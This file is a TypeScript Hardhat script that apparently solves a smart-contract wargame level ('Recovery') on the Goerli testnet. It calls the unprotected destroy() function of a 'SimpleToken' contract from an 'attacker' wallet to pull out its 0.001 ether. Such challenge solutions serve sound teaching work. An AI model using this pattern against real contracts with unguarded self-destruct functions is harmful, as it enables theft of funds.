import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "SimpleToken"
const CONTRACT_ADDRESS = "0xd2B5c3a8469Ea199390e585c7A9ac71874122516"

async function main() {
    const Recovery = await ethers.getContractFactory(CONTRACT_NAME)
    const recovery = Recovery.attach(CONTRACT_ADDRESS)

    let tx: TransactionResponse = await recovery.connect(attacker).destroy(attacker.address, { gasLimit: 1000000 })
    await tx.wait()
    
    console.log("Recovery: recovered the 0.001 ether from the lost contract address");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });